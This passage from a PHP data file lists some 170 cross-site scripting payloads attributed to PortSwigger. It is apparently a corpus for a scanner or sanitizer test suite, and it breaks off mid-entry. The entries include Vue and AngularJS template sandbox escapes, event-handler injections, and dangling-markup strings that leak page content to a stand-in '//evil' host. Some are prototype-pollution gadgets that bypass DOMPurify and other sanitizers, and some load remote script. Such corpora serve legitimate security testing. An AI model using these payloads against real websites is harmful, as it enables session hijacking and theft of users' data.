            'portswigger-692' => [
                'payload' => '<a @[\'c\\lic\\u{6b}\']="_c.constructor(\'alert(1)\')()">test</a>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-693' => [
                'payload' => '{{$el.ownerDocument.defaultView.alert(1)}}',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-694' => [
                'payload' => '{{$el.innerHTML=\'\\u003cimg src onerror=alert(1)\\u003e\'}}',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-695' => [
                'payload' => '<img src @error=e=$event.path.pop().alert(1)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-696' => [
                'payload' => '<img src @error=e=$event.composedPath().pop().alert(1)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-697' => [
                'payload' => '<img src @error=this.alert(1)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-698' => [
                'payload' => '<svg@load=this.alert(1)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-699' => [
                'payload' => '<p slot-scope="){}}])+this.constructor.constructor(\'alert(1)\')()})};//">',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-700' => [
                'payload' => '{{_openBlock.constructor(\'alert(1)\')()}}',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-701' => [
                'payload' => '{{_createBlock.constructor(\'alert(1)\')()}}',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-702' => [
                'payload' => '{{_toDisplayString.constructor(\'alert(1)\')()}}',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-703' => [
                'payload' => '{{_createVNode.constructor(\'alert(1)\')()}}',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-704' => [
                'payload' => '<p v-show=_createBlock.constructor`alert(1)`()>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-705' => [
                'payload' => '<x @[_openBlock.constructor`alert(1)`()]>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-706' => [
                'payload' => '<x @[_capitalize.constructor`alert(1)`()]>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-707' => [
                'payload' => '<x @click=_withCtx.constructor`alert(1)`()>click</x>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-708' => [
                'payload' => '<x @click=$event.view.alert(1)>click</x>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-709' => [
                'payload' => '{{_Vue.h.constructor`alert(1)`()}}',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-710' => [
                'payload' => '{{$emit.constructor`alert(1)`()}}',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-711' => [
                'payload' => '<teleport to=script:nth-child(2)>alert&lpar;1&rpar;</teleport></div><script></script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-712' => [
                'payload' => '<component is=script text=alert(1)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-713' => [
                'payload' => '{{$on.constructor(\'alert(1)\')()}}',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-714' => [
                'payload' => '{{a=\'constructor\';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,\'alert(1)\')()}}',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-715' => [
                'payload' => '{{{}.")));alert(1)//"}}',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-716' => [
                'payload' => '{{(_=\'\'.sub).call.call({}[$=\'constructor\'].getOwnPropertyDescriptor(_.__proto__,$).value,0,\'alert(1)\')()}}',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-717' => [
                'payload' => '{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor);}}',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-718' => [
                'payload' => '{{!ready && (ready = true) && (',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-719' => [
                'payload' => '!call',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-720' => [
                'payload' => '? $$watchers[0].get(toString.constructor.prototype)',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-721' => [
                'payload' => ': (a = apply) &&',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-722' => [
                'payload' => '(apply = constructor) &&',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-723' => [
                'payload' => '(valueOf = call) &&',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-724' => [
                'payload' => '(\'\'+\'\'.toString(',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-725' => [
                'payload' => '\'F = Function.prototype;\' +',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-726' => [
                'payload' => '\'F.apply = F.a;\' +',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-727' => [
                'payload' => '\'delete F.a;\' +',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-728' => [
                'payload' => '\'delete F.valueOf;\' +',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-729' => [
                'payload' => '\'alert(1);\'',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-730' => [
                'payload' => ')));}}',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-731' => [
                'payload' => '{{{}[{toString:[].join,length:1,0:\'__proto__\'}].assign=[].join;\'a\'.constructor.prototype.charAt=[].join;$eval(\'x=alert(1)//\');}}',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-732' => [
                'payload' => '{{\'a\'[{toString:false,valueOf:[].join,length:1,0:\'__proto__\'}].charAt=[].join;$eval(\'x=alert(1)//\');}}',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-733' => [
                'payload' => '{{\'a\'.constructor.prototype.charAt=[].join;$eval(\'x=alert(1)\');}}',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-734' => [
                'payload' => '{{\'a\'.constructor.prototype.charAt=[].join;$eval(\'x=1} } };alert(1)//\');}}',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-735' => [
                'payload' => '{{x={\'y\':\'\'.constructor.prototype};x[\'y\'].charAt=[].join;$eval(\'x=alert(1)\');}}',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-736' => [
                'payload' => 'constructor.constructor(\'alert(1)\')()',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-737' => [
                'payload' => 'a=\'constructor\';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,\'alert(1)\')()',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-738' => [
                'payload' => 'toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor)',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-739' => [
                'payload' => '{}.")));alert(1)//";',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-740' => [
                'payload' => '\'a\'.constructor.prototype.charAt=[].join;[1]|orderBy:\'x=1} } };alert(1)//\';',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-741' => [
                'payload' => '{y:\'\'.constructor.prototype}.y.charAt=[].join;[1]|orderBy:\'x=alert(1)\'',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-742' => [
                'payload' => '<input autofocus ng-focus="$event.composedPath()|orderBy:\'[].constructor.from([1],alert)\'">',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-743' => [
                'payload' => '<input id=x ng-focus=$event.composedPath()|orderBy:\'(z=alert)(1)\'>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-744' => [
                'payload' => '<div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == \'window\'">{{ [1].reduce(value.alert, 1); }}</div></div></div>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-745' => [
                'payload' => '<input ng-cut=$event.composedPath()|orderBy:\'(y=alert)(1)\'>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-746' => [
                'payload' => '<body background="//evil?',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-747' => [
                'payload' => '<table background="//evil?',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-748' => [
                'payload' => '<table><thead background="//evil?',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-749' => [
                'payload' => '<table><tbody background="//evil?',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-750' => [
                'payload' => '<table><tfoot background="//evil?',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-751' => [
                'payload' => '<table><td background="//evil?',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-752' => [
                'payload' => '<table><th background="//evil?',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-753' => [
                'payload' => '<link rel=stylesheet href="//evil?',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-754' => [
                'payload' => '<link rel=icon href="//evil?',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-755' => [
                'payload' => '<meta http-equiv="refresh" content="0; http://evil?',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-756' => [
                'payload' => '<img src="//evil?',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-757' => [
                'payload' => '<image src="//evil?',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-758' => [
                'payload' => '<video><track default src="//evil?',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-759' => [
                'payload' => '<video><source src="//evil?',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-760' => [
                'payload' => '<audio><source src="//evil?',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-761' => [
                'payload' => '<input type=image src="//evil?',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-762' => [
                'payload' => '<form><button style="width:100%;height:100%" type=submit formaction="//evil?',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-763' => [
                'payload' => '<form><input type=submit value="XSS" style="width:100%;height:100%" type=submit formaction="//evil?',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-764' => [
                'payload' => '<button form=x style="width:100%;height:100%;"><form id=x action="//evil?',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-765' => [
                'payload' => '<object data="//evil?',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-766' => [
                'payload' => '<iframe src="//evil?',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-767' => [
                'payload' => '<embed src="//evil?',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-768' => [
                'payload' => '<form><button formaction=//evil>XSS</button><textarea name=x>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-769' => [
                'payload' => '<button form=x>XSS</button><form id=x action=//evil target=\'',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-770' => [
                'payload' => '<a href=http://subdomain1.portswigger-labs.net/dangling_markup/name.html><font size=100 color=red>You must click me</font></a><base target="',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-771' => [
                'payload' => '<form><input type=submit value="Click me" formaction=http://subdomain1.portswigger-labs.net/dangling_markup/name.html formtarget="',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-772' => [
                'payload' => '<a href=abc style="width:100%;height:100%;position:absolute;font-size:1000px;">xss<base href="//evil/',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-773' => [
                'payload' => '<embed src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name="',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-774' => [
                'payload' => '<iframe src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name="',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-775' => [
                'payload' => '<object data=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name="',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-776' => [
                'payload' => '<frameset><frame src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name="',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-777' => [
                'payload' => '<input type=hidden type=image src="//evil?',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-778' => [
                'payload' => '<video poster="//evil?',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-779' => [
                'payload' => 'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-780' => [
                'payload' => 'javascript:"/*\'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \\"',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-781' => [
                'payload' => ' onmouseover=/*&lt;svg/*/onload=alert()//>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-782' => [
                'payload' => 'javascript:/*--></title></style></textarea></script></xmp><details/open/ontoggle=\'+/`/+/"/+/onmouseover=1/+/[*/[]/+alert(/@PortSwiggerRes/)//\'>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-783' => [
                'payload' => '\';window[/*foo*/\'alert\'/*bar*/](window[/*foo*/\'document\'/*bar*/][\'domain\']);//',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-784' => [
                'payload' => '\';self[/*foo*/\'alert\'/*bar*/](self[/*foo*/\'document\'/*bar*/][\'domain\']);//',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-785' => [
                'payload' => '\';this[/*foo*/\'alert\'/*bar*/](this[/*foo*/\'document\'/*bar*/][\'domain\']);//',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-786' => [
                'payload' => '\';top[/*foo*/\'alert\'/*bar*/](top[/*foo*/\'document\'/*bar*/][\'domain\']);//',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-787' => [
                'payload' => '\';parent[/*foo*/\'alert\'/*bar*/](parent[/*foo*/\'document\'/*bar*/][\'domain\']);//',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-788' => [
                'payload' => '\';frames[/*foo*/\'alert\'/*bar*/](frames[/*foo*/\'document\'/*bar*/][\'domain\']);//',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-789' => [
                'payload' => '\';globalThis[/*foo*/\'alert\'/*bar*/](globalThis[/*foo*/\'document\'/*bar*/][\'domain\']);//',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-790' => [
                'payload' => '<script>Object.prototype.innerHTML = \'<img/src/onerror=alert(1)>\';</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-791' => [
                'payload' => '<script>Object.prototype.preventDefault=\'x\';Object.prototype.handleObj=\'x\';Object.prototype.delegateTarget=\'<img/src/onerror=alert(1)>\';/* No extra code needed for jQuery 1 & 2 */$(document).off(\'foobar\');</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-792' => [
                'payload' => '<script>Object.prototype.div=[\'1\',\'<img src onerror=alert(1)>\',\'1\']</script><script>$(\'<div x="x"></div>\')</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-793' => [
                'payload' => '<script>Object.prototype.url = [\'data:,alert(1)//\'];Object.prototype.dataType = \'script\';</script><script>$.get(\'https://google.com/\');$.post(\'https://google.com/\');</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-794' => [
                'payload' => '<script>Object.prototype.src = [\'data:,alert(1)//\']</script><script>$.getScript(\'https://google.com/\')</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-795' => [
                'payload' => '<script>Object.prototype.url = \'data:,alert(1)//\'</script><script>$.getScript(\'https://google.com/\')</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-796' => [
                'payload' => '<script>Object.prototype.srcdoc=[\'<script>alert(1)<\\/script>\']</script><div class="g-recaptcha" data-sitekey="your-site-key"/>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-797' => [
                'payload' => '<script>Object.prototype.hif = [\'javascript:alert(document.domain)\'];</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-798' => [
                'payload' => '<script>Object.prototype.attrs = {src:1};Object.prototype.src=\'https://portswigger-labs.net/xss/xss.js\'</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-799' => [
                'payload' => '<script>Object.prototype.BOOMR = 1;Object.prototype.url=\'https://portswigger-labs.net/xss/xss.js\'</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-800' => [
                'payload' => '<script>Object.prototype.sourceURL = \'\\u2028\\u2029alert(1)\'</script><script>_.template(\'test\')</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-801' => [
                'payload' => '<script>Object.prototype[\'*\'] = [\'onload\']</script><script>document.write(sanitizeHtml(\'<iframe onload=alert(1)>\'))</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-802' => [
                'payload' => '<script>Object.prototype.whiteList = {img: [\'onerror\', \'src\']}</script><script>document.write(filterXSS(\'<img src onerror=alert(1)>\'))</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-803' => [
                'payload' => '<script>Object.prototype.ALLOWED_ATTR = [\'onerror\', \'src\']</script><script>document.write(DOMPurify.sanitize(\'<img src onerror=alert(1)>\'))</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-804' => [
                'payload' => '<script>Object.prototype.documentMode = 9</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-805' => [
                'payload' => '<script>const html = \'<img src onerror=alert(1)>\';const sanitizer = new goog.html.sanitizer.HtmlSanitizer();const sanitized = sanitizer.sanitize(html);const node = goog.dom.safeHtmlToNode(sanitized);document.body.append(node);</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-806' => [
                'payload' => '<script>Object.prototype.CLOSURE_BASE_PATH = \'data:,alert(1)//\';</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-807' => [
                'payload' => '<script>Object.prototype.src=\'data:,alert(1)//\'</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-808' => [
                'payload' => '<script>Object.prototype.onload = \'alert(1)\'</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-809' => [
                'payload' => '<script>Object.prototype.script = [1,\'<img/src/onerror=alert(1)>\',\'<img/src/onerror=alert(2)>\']</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-810' => [
                'payload' => '<strong data-bind="text:\'hello\'"></strong><script>Object.prototype[4]="a\':1,[alert(1)]:1,\'b";Object.prototype[5]=\',\';</script><script>ko.applyBindings({})</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-811' => [
                'payload' => '<script>Object.prototype.on = \'click\';$(\'body\').on(\'click\', function() { alert(\'Injected Event\'); });$(\'body\').trigger(\'click\');</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-812' => [
                'payload' => '<img src="javascript:alert(1)">',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-813' => [
                'payload' => '<body background="javascript:alert(1)">',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-814' => [
                'payload' => '<iframe src="data:text/html,<img src=1 onerror=alert(document.domain)>">',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-815' => [
                'payload' => '<a href="vbscript:MsgBox+1">XSS</a>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-816' => [
                'payload' => '<a href="#" onclick="vbs:Msgbox+1">XSS</a>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-817' => [
                'payload' => '<a href="#" onclick="VBS:Msgbox+1">XSS</a>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-818' => [
                'payload' => '<a href="#" onclick="vbscript:Msgbox+1">XSS</a>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-819' => [
                'payload' => '<a href="#" onclick="VBSCRIPT:Msgbox+1">XSS</a>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-820' => [
                'payload' => '<a href="#" language=vbs onclick="vbscript:Msgbox+1">XSS</a>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-821' => [
                'payload' => '<a href="#" onclick="jscript.compact:alert(1);">test</a>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-822' => [
                'payload' => '<a href="#" onclick="JSCRIPT.COMPACT:alert(1);">test</a>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-823' => [
                'payload' => '<a href=# language="JScript.Encode" onclick="#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@">XSS</a>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-824' => [
                'payload' => '<a href=# onclick="JScript.Encode:#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@">XSS</a>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-825' => [
                'payload' => '<iframe onload=VBScript.Encode:#@~^CAAAAA==\\ko$K6,FoQIAAA==^#~@>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-826' => [
                'payload' => '<iframe language=VBScript.Encode onload=#@~^CAAAAA==\\ko$K6,FoQIAAA==^#~@>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-827' => [
                'payload' => '<a title="&{alert(1)}">XSS</a>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-828' => [
                'payload' => '<link href="xss.js" rel=stylesheet type="text/javascript">',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-829' => [
                'payload' => '<form><button name=x formaction=x><b>stealme',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-830' => [
                'payload' => '<form action=x><button>XSS</button><select name=x><option><plaintext><script>token="supersecret"</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-831' => [
                'payload' => '<div style=xss:expression(alert(1))>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-832' => [
                'payload' => '<div style=xss:expression(1)-alert(1)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-833' => [
                'payload' => '<div style=xss:expressio\\6e(alert(1))>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-834' => [
                'payload' => '<div style=xss:expressio\\006e(alert(1))>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-835' => [
                'payload' => '<div style=xss:expressio\\00006e(alert(1))>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-836' => [
                'payload' => '<div style=xss:expressio&#x5c;6e(alert(1))>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-837' => [
                'payload' => '<div style=xss=expression(alert(1))>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-838' => [
                'payload' => '<div style="color&#x3dred">test</div>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-839' => [
                'payload' => '<a style="behavior:url(#default#AnchorClick);" folder="javascript:alert(1)">XSS</a>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-840' => [
                'payload' => '<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS<img src=1 onerror=alert(1)>"> </BODY></HTML>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-841' => [
                'payload' => '<a href="javascript& #x6a;avascript:alert(1)">Firefox</a>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-842' => [
                'payload' => '<a href="javascript& colon ;alert(1)">Firefox</a>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-843' => [
                'payload' => '<!- - ><img title="--><iframe/onload=alert(1)>"> -->',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-844' => [
                'payload' => '<!-     - ><img title="--><iframe/onload=alert(1)>"> -->',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-845' => [
                'payload' => '<svg><xss onload=alert(1)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-846' => [
                'payload' => '<isindex type=image src="//evil?',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-847' => [
                'payload' => '<isindex type=submit style=width:100%;height:100%; value=XSS formaction="//evil?',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-848' => [
                'payload' => '<isindex type=submit formaction=javascript:alert(1)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-849' => [
                'payload' => '<isindex type=submit action=javascript:alert(1)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-850' => [
                'payload' => '<svg><discard onbegin=alert(1)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-851' => [
                'payload' => '<svg><use href="//subdomain1.portswigger-labs.net/use_element/upload.php#x" /></svg>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-852' => [
                'payload' => '<img src=validimage.png onloadstart=alert(1)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-853' => [
                'payload' => '<input type=image onloadend=alert(1) src=validimage.png>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-854' => [
                'payload' => '<marquee width=1 loop=1 onbounce=alert(1)>XSS</marquee>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-855' => [
                'payload' => '<marquee width=1 loop=1 onfinish=alert(1)>XSS</marquee>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-856' => [
                'payload' => '<marquee onstart=alert(1)>XSS</marquee>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-857' => [
                'payload' => '<div contextmenu=xss><p>Right click<menu type=context id=xss onshow=alert(1)></menu></div>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-858' => [
                'payload' => '<script>location.protocol=\'javascript\'</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-859' => [
                'payload' => '<a href="%0aalert(1)" onclick="protocol=\'javascript\'">test</a>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-860' => [
                'payload' => '<svg><use href="data:image/svg+xml,&lt;svg id=\'x\' xmlns=\'http://www.w3.org/2000/svg\'&gt;&lt;image href=\'1\' onerror=\'alert(1)\' /&gt;&lt;/svg&gt;#x" />',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-861' => [
                'payload' => '<a href="javascript://%0aalert(1)">XSS</a>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-862' => [
                'payload' => '<base href="javascript:/a/-alert(1)///////"><a href=../lol/safari.html>test</a>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-863' => [
